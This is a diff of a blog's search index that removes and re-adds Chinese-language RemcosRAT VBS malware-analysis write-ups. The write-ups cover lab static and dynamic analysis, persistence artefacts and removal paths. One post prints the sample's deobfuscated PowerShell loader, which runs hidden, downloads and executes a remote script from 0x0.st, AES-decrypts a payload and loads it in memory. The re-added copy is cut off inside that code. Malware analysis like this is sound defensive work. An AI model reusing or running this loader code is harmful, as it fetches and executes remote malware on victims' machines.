@@ -212,294 +212,6 @@
       </tags>
   </entry>
   <entry>
-    <title>【惡意軟體分析】- 10 - vbs</title>
-    <url>/posts/33372/</url>
-    <content><![CDATA[<hr>
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
-<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
-</blockquote>
-<font size='3'>
-在本練習中，我們將對 vbs 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
-</font>
-
-<br>
-
-<hr>
-<span id="more"></span>
-
-
-<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
-<li><p><font size='3'>Linux Remnux ( Static Analysis )</font></p>
-</li>
-<li><p><font size='3'>Windows 11 ( Dynamic Analysis )</font></p>
-</li>
-<li><p><a href='https://bazaar.abuse.ch/sample/894037000ac4b08de6e6b0f616ca0b98fc4ab11ce8dced92cee7d52f4f7ce78f//' target='_blank'><font size='3' color='#33ccff'>RemcosRAT.vbs</font></a></p>
-</li>
-<li><p><font size='3'>HASH256：<code>894037000ac4b08de6e6b0f616ca0b98fc4ab11ce8dced92cee7d52f4f7ce78f</code></font></p>
-</li>
-</ul>
-<hr>
-<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
-<br>
-
-
-<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
-<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
-<li><font size='3'>Virustotal   → 檢查 hash</font></li>
-</ul>
-<br>
-
-<hr>
-<br>
-
-<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
-<li><font size='3'>查看有無參考資訊</font></li>
-</ul>
-<br>
-
-<p><img data-src='pe-studio-1.png' align='center' width='700' alt='PEStudio'></img></p>
-<br>
-
-<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
-<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
-</ul>
-<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
-<br>
-
-<hr>
-<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
-<br>
-
-<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
-<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
-<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
-</ul>
-<br>
-
-<hr>
-<br>
-
-<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
-<li><font size='3'>查看有無錄製到可疑的路徑、檔案行為</font><ul>
-<li><font size='3'>找尋 <code>wscript.exe</code> ，確實看到一個在 <code>TMP</code> 下面的 <code>bat</code> 檔 ( 明顯有問題 )。</font></li>
-</ul>
-</li>
-</ul>
-<p><img data-src='procmon-1.png' width='700' align='center' alt='Procmon'></img></p>
-<br>
-
-<p><img data-src='procmon-2.png' width='700' align='center' alt='另開 cmd 運行 bat 檔案'></img></p>
-<br>
-
-<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
-<li>檢查有無可疑的路徑、檔案。</li>
-</ul>
-<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
-<br>
-
-<hr>
-<h4 id="1️⃣-notepad"><a href="#1️⃣-notepad" class="headerlink" title="1️⃣ notepad"></a>1️⃣ notepad</h4><ul>
-<li><font size='3'>打開惡意程式查看</font></li>
-</ul>
-<p><img data-src='vbs-text-1.png' width='700' align='center' alt='使用 NotePad 查看代碼'></img></p>
-<br>
-
-<hr>
-<br>
-
-
-<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
-<li><p><font size='3'>執行後會加入 <code>Logon</code> 常駐，並建立 <code>.bat</code> 檔案至 tmp 。 </font></p>
-</li>
-<li><p><font size='3'>移除：</font></p>
-<ul>
-<li><font size='3'><code>C:\Users\ADMINI~1\AppData\Local\Temp\1\Jq1fkvQOn.bat</code></font></li>
-<li><font size='3'><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start   Menu\Programs\Startup\StartupScript_79f00caa.cmd</code></font></li>
-</ul>
-</li>
-</ul>
-<br>
-
-
-<hr>
-<br>
-
-<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
-<li><font size='3'><code>Pending</code></font></li>
-</ul>
-<br>
-
-<hr>
-<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
-<li><font size='3'> 暫無 </font><!-- - <font size='3'> [A Beginner’s Analysis of RemcosRAT Malware
-](https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992) </font> --></li>
-</ul>
-<br>]]></content>
-      <categories>
-        <category>analysis</category>
-      </categories>
-      <tags>
-        <tag>analysis</tag>
-        <tag>malware</tag>
-        <tag>vbs</tag>
-        <tag>Pending</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【惡意軟體分析】- 03 - vbs</title>
-    <url>/posts/32167/</url>
-    <content><![CDATA[<hr>
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
-<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
-</blockquote>
-<font size='3'>
-在本練習中，我們將對 vbs 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
-</font>
-
-<br>
-
-<hr>
-<span id="more"></span>
-
-
-<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
-<li><p><font size='3'>Linux Remnux ( Static Analysis )</font></p>
-</li>
-<li><p><font size='3'>Windows 11 ( Dynamic Analysis )</font></p>
-</li>
-<li><p><a href='https://bazaar.abuse.ch/sample/01ed509842998f2309e2aa5ff2aaba7f12fec0e25c7a7a6f01d5d672c6a06363/' target='_blank'><font size='3' color='#33ccff'>RemcosRAT.vbs</font></a></p>
-</li>
-<li><p><font size='3'>HASH256：<code>01ed509842998f2309e2aa5ff2aaba7f12fec0e25c7a7a6f01d5d672c6a06363</code></font></p>
-</li>
-</ul>
-<hr>
-<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
-<br>
-
-
-<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
-<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
-<li><font size='3'>Virustotal   → 檢查 hash</font></li>
-</ul>
-<br>
-
-<hr>
-<br>
-
-<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
-<li><font size='3'>檔案的名稱、副檔名皆可以更改，所以需要檢查檔案類型。</font></li>
-<li><font size='3'>查看檔案資訊是否有可疑地方</font><ul>
-<li><font size='3'><code>CreateObject(&quot;Scripting.FileSystemObject&quot;)</code> ： 建立&#x2F;修改&#x2F;刪除檔案、寫入執行指令。</font></li>
-<li><font size='3'><code>Set kSPdG = YIEhr.CreateTextFile(YoSeb &amp; &quot;\&quot; &amp; randomVBSBatName, True)&quot;</code> ： 建立一個 bat 檔案。</font></li>
-</ul>
-</li>
-</ul>
-<p><img data-src='pe-studio-1.png' align='center' width='700' alt='知道該檔案確定是 PE32 格式'></img></p>
-<br>
-
-<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
-<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
-</ul>
-<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
-<br>
-
-<h4 id="3️⃣-Virustotal"><a href="#3️⃣-Virustotal" class="headerlink" title="3️⃣ Virustotal"></a>3️⃣ Virustotal</h4><ul>
-<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
-</ul>
-<br>
-
-
-<hr>
-<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
-<br>
-
-<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
-<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
-<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
-</ul>
-<br>
-
-<hr>
-<br>
-
-<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
-<li><font size='3'>查看有無錄製到可疑的路徑、檔案行為</font><ul>
-<li><font size='3'>找尋 <code>wscript.exe</code> ，確實看到一個在 <code>TMP</code> 下面的 <code>bat</code> 檔 ( 明顯有問題 )。</font></li>
-</ul>
-</li>
-</ul>
-<p><img data-src='procmon-1.png' width='700' align='center' alt='Procmon'></img></p>
-<br>
-
-<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
-<li>檢查有無可疑的路徑、檔案。<ul>
-<li>找到一個可疑檔案 ( 名稱可以、副檔名不對、路徑不對、無憑證 )。</li>
-</ul>
-</li>
-</ul>
-<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
-<br>
-
-<hr>
-<h4 id="1️⃣-vbsEdit"><a href="#1️⃣-vbsEdit" class="headerlink" title="1️⃣ vbsEdit"></a>1️⃣ vbsEdit</h4><ul>
-<li><font size='3'>打開惡意程式</font></li>
-</ul>
-<p><img data-src='vba-edit-1.png' width='700' align='center' alt='使用 NotePad 查看代碼'></img></p>
-<br>
-
-<p><img data-src='vba-edit-2.png' width='700' align='center' alt='使用 VBAEdit 查看代碼'></img></p>
-<br>
-
-<hr>
-<br>
-
-
-<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
-<li><p><font size='3'>該程式會偽裝成無害的檔案誘使受害者點擊。</font></p>
-</li>
-<li><p><font size='3'>移除：</font></p>
-<ul>
-<li><font size='3'><code>C:\Users\ADMINI~1\AppData\Local\Temp\1\IXeqOHqsNh.bat</code></font></li>
-<li><font size='3'><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start   Menu\Programs\Startup\StartupScript_7fff24c6.cmd</code></font></li>
-</ul>
-</li>
-</ul>
-<br>
-
-
-<hr>
-<br>
-
-<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
-<li><font size='3'> 整理一下代碼：<code>Pending</code></font><ul>
-<li><font size='3'>BASE64</font></li>
-<li><font size='3'>AES</font></li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;%FsxeI%s%FsxeI%e%FsxeI%t%FsxeI% &quot;&quot;TIZVOs=;</span><br><span class="line"></span><br><span class="line">$QfYeqOS=&#x27;Split&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ReadLines&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;Decompress&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;MainModule&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;CreateDecryptor&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;CopyTo&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ChangeExtension&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;TransformFinalBlock&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ElementAt&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;GetCurrentProcess&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;Invoke&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;EntryPoint&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">powershell -w hidden;</span><br><span class="line"></span><br><span class="line">iex (($([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;U1RSSU5HUkFORE9NaVNUUklOR1JBTkRPTWVTVFJJTkdSQU5ET014ICgoaVNUUklOR1JkRPTXdTVFJJTkdSQU5ET01yU1RSSU5HUkFORE9NIC1TVFJJTkdSQU5ET01VU1RSSU5HUkFORE9Nc1NUUklOR1JkRPTWVTVFJJTkdSQU5ET01CU1RSSU5HUkFORE9NYVNUUklOR1JkRPTXNTVFJJTkdSQU5ET01pU1RSSU5HUkFORE9NY1NUUklOR1JkRPTVVFJJTkdSQU5ET01hU1RSSU5HUkFORE9NclNUUklOR1JkRPTXNTVFJJTkdSQU5ET01pU1RSSU5HUkFORE9NblNUUklOR1JkRPTWdTVFJJTkdSQU5ET00gIlNUUklOR1JkRPTWhTVFJJTkdSQU5ET010dHBzU1RSSU5HUkFORE9NOlNUUklOR1JBTkRPTS9TVFJJTkdSQU5ET00vU1RSSU5HUkFORE9NMFNUUklOR1JBTkRPTXhTVFJJTkdSQU5ET00wU1RSSU5HUkFORE9NLlNUUklOR1JkRPTXNTVFJJTkdSQU5ET010U1RSSU5HUkFORE9NL1NUUklOR1JkRPTThTVFJJTkdSQU5ET01aU1RSSU5HUkFORE9NRFNUUklOR1JkRPTWFTVFJJTkdSQU5ET00uU1RSSU5HUkFORE9NdFNUUklOR1JBTkRPTXhTVFJJTkdSQU5ET010U1RSSU5HUkFORE9NIikuQ29udGVudC5SZXBsYWNlKCdBQkMnLCcnKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7&#x27;)))) -replace &#x27;STRINGRANDOM&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">iex (($([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;aWV4ICgoaXdyIC1Vc2VCYXNpY1BhcnNpbmcgImh0dHBzOi8vMHgwLnN0LzhaZXkucHMxIikuQ29udGVudC5SZXBsYWNlKCdBQkMnLCcnKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7&#x27;)))) -replace &#x27;STRINGRANDOM&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">## 解碼過後</span><br><span class="line"></span><br><span class="line">iex (</span><br><span class="line">  (iwr -UseBasicParsing &quot;https://0x0.st/xxxx.ps1&quot;).Content.Replace(&#x27;ABC&#x27;,&#x27;&#x27;)</span><br><span class="line">) -ErrorAction SilentlyContinue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function decrypt_function($param_var)&#123;$aes_var=[System.Security.Cryptography.Aes]::Create();</span><br><span class="line"></span><br><span class="line">$aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;</span><br><span class="line"></span><br><span class="line">$aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;</span><br><span class="line"></span><br><span class="line">$aes_var.Key=[System.Convert]::FromBase64String(&#x27;ewMoxjcpzeNBZW19N7eS0/ZStjAsKH1ZQlG6Hp4+rlE=&#x27;);</span><br><span class="line"></span><br><span class="line">$aes_var.IV=[System.Convert]::FromBase64String(&#x27;GwaE+1wDAP4SIjKqb1sLhw==&#x27;);</span><br><span class="line"></span><br><span class="line">$FAPRA=$aes_var.($QfYeqOS[4])();</span><br><span class="line"></span><br><span class="line">$cJMDe=$FAPRA.($QfYeqOS[7])($param_var,0,$param_var.Length);</span><br><span class="line"></span><br><span class="line">$FAPRA.Dispose();</span><br><span class="line"></span><br><span class="line">$aes_var.Dispose();</span><br><span class="line"></span><br><span class="line">$cJMDe;</span><br><span class="line"></span><br><span class="line">&#125;function decompress_function($param_var)&#123;$OMBpZ=New-Object System.IO.MemoryStream(,$param_var);</span><br><span class="line"></span><br><span class="line">$ZMdDq=New-Object System.IO.MemoryStream;</span><br><span class="line"></span><br><span class="line">$ztAGx=New-Object System.IO.Compression.GZipStream($OMBpZ,[IO.Compression.CompressionMode]::($QfYeqOS[2]));</span><br><span class="line"></span><br><span class="line">$ztAGx.($QfYeqOS[5])($ZMdDq);</span><br><span class="line"></span><br><span class="line">$ztAGx.Dispose();</span><br><span class="line"></span><br><span class="line">$OMBpZ.Dispose();</span><br><span class="line"></span><br><span class="line">$ZMdDq.Dispose();</span><br><span class="line"></span><br><span class="line">$ZMdDq.ToArray();</span><br><span class="line"></span><br><span class="line">&#125;$YZNls=[System.IO.File]::($QfYeqOS[1])([Console]::Title);</span><br><span class="line"></span><br><span class="line">$eOuee=decompress_function (decrypt_function ([Convert]::FromBase64String([System.Linq.Enumerable]::($QfYeqOS[8])($YZNls, 6).Substring(2))));</span><br><span class="line"></span><br><span class="line">[System.Reflection.Assembly]::Load([byte[]]$eOuee).($QfYeqOS[11]).($QfYeqOS[10])($null,$null);</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">kSPdG.writeline &quot;%egViW%s%egViW%e%egViW%t%egViW% &quot;&quot;JMEsIb=$host.UI.RawUI.WindowTitle=&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
-<!-- <img data-src='hide-malware.png' width='700' align='center' alt='待解析'></img> -->
-
-<br>
-
-<hr>
-<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
-<li><font size='3'> 暫無 </font><!-- - <font size='3'> [A Beginner’s Analysis of RemcosRAT Malware
-](https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992) </font> --></li>
-</ul>
-<br>]]></content>
-      <categories>
-        <category>analysis</category>
-      </categories>
-      <tags>
-        <tag>analysis</tag>
-        <tag>malware</tag>
-        <tag>vbs</tag>
-        <tag>Pending</tag>
-        <tag>RemcosRAT</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【工具介紹】ISO 映像檔燒錄 USB 隨身碟</title>
     <url>/posts/5670/</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h3><blockquote>
@@ -813,6 +525,160 @@ vssadmin -->]]></content>
       </tags>
   </entry>
   <entry>
+    <title>【惡意軟體分析】- 03 - vbs</title>
+    <url>/posts/32167/</url>
+    <content><![CDATA[<hr>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
+<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
+</blockquote>
+<font size='3'>
+在本練習中，我們將對 vbs 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
+</font>
+
+<br>
+
+<hr>
+<span id="more"></span>
+
+
+<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
+<li><p><font size='3'>Linux Remnux ( Static Analysis )</font></p>
+</li>
+<li><p><font size='3'>Windows 11 ( Dynamic Analysis )</font></p>
+</li>
+<li><p><a href='https://bazaar.abuse.ch/sample/01ed509842998f2309e2aa5ff2aaba7f12fec0e25c7a7a6f01d5d672c6a06363/' target='_blank'><font size='3' color='#33ccff'>RemcosRAT.vbs</font></a></p>
+</li>
+<li><p><font size='3'>HASH256：<code>01ed509842998f2309e2aa5ff2aaba7f12fec0e25c7a7a6f01d5d672c6a06363</code></font></p>
+</li>
+</ul>
+<hr>
+<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
+<br>
+
+
+<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
+<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
+<li><font size='3'>Virustotal   → 檢查 hash</font></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
+<li><font size='3'>檔案的名稱、副檔名皆可以更改，所以需要檢查檔案類型。</font></li>
+<li><font size='3'>查看檔案資訊是否有可疑地方</font><ul>
+<li><font size='3'><code>CreateObject(&quot;Scripting.FileSystemObject&quot;)</code> ： 建立&#x2F;修改&#x2F;刪除檔案、寫入執行指令。</font></li>
+<li><font size='3'><code>Set kSPdG = YIEhr.CreateTextFile(YoSeb &amp; &quot;\&quot; &amp; randomVBSBatName, True)&quot;</code> ： 建立一個 bat 檔案。</font></li>
+</ul>
+</li>
+</ul>
+<p><img data-src='pe-studio-1.png' align='center' width='700' alt='知道該檔案確定是 PE32 格式'></img></p>
+<br>
+
+<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
+<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
+</ul>
+<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
+<br>
+
+<h4 id="3️⃣-Virustotal"><a href="#3️⃣-Virustotal" class="headerlink" title="3️⃣ Virustotal"></a>3️⃣ Virustotal</h4><ul>
+<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
+</ul>
+<br>
+
+
+<hr>
+<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
+<br>
+
+<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
+<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
+<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
+<li><font size='3'>查看有無錄製到可疑的路徑、檔案行為</font><ul>
+<li><font size='3'>找尋 <code>wscript.exe</code> ，確實看到一個在 <code>TMP</code> 下面的 <code>bat</code> 檔 ( 明顯有問題 )。</font></li>
+</ul>
+</li>
+</ul>
+<p><img data-src='procmon-1.png' width='700' align='center' alt='Procmon'></img></p>
+<br>
+
+<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
+<li>檢查有無可疑的路徑、檔案。<ul>
+<li>找到一個可疑檔案 ( 名稱可以、副檔名不對、路徑不對、無憑證 )。</li>
+</ul>
+</li>
+</ul>
+<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
+<br>
+
+<hr>
+<h4 id="1️⃣-vbsEdit"><a href="#1️⃣-vbsEdit" class="headerlink" title="1️⃣ vbsEdit"></a>1️⃣ vbsEdit</h4><ul>
+<li><font size='3'>打開惡意程式</font></li>
+</ul>
+<p><img data-src='vba-edit-1.png' width='700' align='center' alt='使用 NotePad 查看代碼'></img></p>
+<br>
+
+<p><img data-src='vba-edit-2.png' width='700' align='center' alt='使用 VBAEdit 查看代碼'></img></p>
+<br>
+
+<hr>
+<br>
+
+
+<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
+<li><p><font size='3'>該程式會偽裝成無害的檔案誘使受害者點擊。</font></p>
+</li>
+<li><p><font size='3'>移除：</font></p>
+<ul>
+<li><font size='3'><code>C:\Users\ADMINI~1\AppData\Local\Temp\1\IXeqOHqsNh.bat</code></font></li>
+<li><font size='3'><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start   Menu\Programs\Startup\StartupScript_7fff24c6.cmd</code></font></li>
+</ul>
+</li>
+</ul>
+<br>
+
+
+<hr>
+<br>
+
+<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
+<li><font size='3'> 整理一下代碼：<code>Pending</code></font><ul>
+<li><font size='3'>BASE64</font></li>
+<li><font size='3'>AES</font></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;%FsxeI%s%FsxeI%e%FsxeI%t%FsxeI% &quot;&quot;TIZVOs=;</span><br><span class="line"></span><br><span class="line">$QfYeqOS=&#x27;Split&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ReadLines&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;Decompress&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;MainModule&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;CreateDecryptor&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;CopyTo&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ChangeExtension&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;TransformFinalBlock&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ElementAt&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;GetCurrentProcess&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;Invoke&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;EntryPoint&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">powershell -w hidden;</span><br><span class="line"></span><br><span class="line">iex (($([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;U1RSSU5HUkFORE9NaVNUUklOR1JBTkRPTWVTVFJJTkdSQU5ET014ICgoaVNUUklOR1JkRPTXdTVFJJTkdSQU5ET01yU1RSSU5HUkFORE9NIC1TVFJJTkdSQU5ET01VU1RSSU5HUkFORE9Nc1NUUklOR1JkRPTWVTVFJJTkdSQU5ET01CU1RSSU5HUkFORE9NYVNUUklOR1JkRPTXNTVFJJTkdSQU5ET01pU1RSSU5HUkFORE9NY1NUUklOR1JkRPTVVFJJTkdSQU5ET01hU1RSSU5HUkFORE9NclNUUklOR1JkRPTXNTVFJJTkdSQU5ET01pU1RSSU5HUkFORE9NblNUUklOR1JkRPTWdTVFJJTkdSQU5ET00gIlNUUklOR1JkRPTWhTVFJJTkdSQU5ET010dHBzU1RSSU5HUkFORE9NOlNUUklOR1JBTkRPTS9TVFJJTkdSQU5ET00vU1RSSU5HUkFORE9NMFNUUklOR1JBTkRPTXhTVFJJTkdSQU5ET00wU1RSSU5HUkFORE9NLlNUUklOR1JkRPTXNTVFJJTkdSQU5ET010U1RSSU5HUkFORE9NL1NUUklOR1JkRPTThTVFJJTkdSQU5ET01aU1RSSU5HUkFORE9NRFNUUklOR1JkRPTWFTVFJJTkdSQU5ET00uU1RSSU5HUkFORE9NdFNUUklOR1JBTkRPTXhTVFJJTkdSQU5ET010U1RSSU5HUkFORE9NIikuQ29udGVudC5SZXBsYWNlKCdBQkMnLCcnKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7&#x27;)))) -replace &#x27;STRINGRANDOM&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">iex 